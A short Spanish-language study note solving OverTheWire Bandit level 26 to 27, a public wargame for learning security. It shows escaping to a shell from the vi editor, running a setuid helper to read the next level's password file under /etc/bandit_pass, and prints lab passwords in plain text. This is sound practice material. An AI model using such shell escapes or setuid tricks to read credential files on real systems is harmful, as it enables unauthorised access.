# Bandit

## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de acceso
usuario: **bandit26**
Servidor **bandit.labs.overthewire.org**
Puerto de acceso **2220**
Contraseña:  ==**c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1**==
Contraseña obtenida en el [[Nivel 25 - 26]]
## Solución
Se aplica la misma solucion que el [[Nivel 25 - 26]], se entra al editor VI, se da el comando
``` bash
set shell=/bin/bash
```
Se sale con escape :, y despues se da el comando 
``` bash
shell
```
Despues de esto se puede acceder al shell de la maquina
```bash
bandit26@bandit:~$ ls -la                                                                                                                                               total 44                                                                                                                                                                drwxr-xr-x  3 root     root      4096 Sep  1 06:30 .                                                                                                                    drwxr-xr-x 49 root     root      4096 Sep  1 06:30 ..                                                                                                                   -rwsr-x---  1 bandit27 bandit26 14872 Sep  1 06:30 bandit27-do                                                                                                          -rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout                                                                                                         -rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc                                                                                                              -rw-r--r--  1 root     root       807 Jan  6  2022 .profile                                                                                                             drwxr-xr-x  2 root     root      4096 Sep  1 06:30 .ssh                                                                                                                 -rw-r-----  1 bandit26 bandit26   258 Sep  1 06:30 text.txt                                                                                                             bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27                                                                                                          YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS                                                                                                                                        bandit26@bandit:~$
```
## Notas adicionales

## Referencias
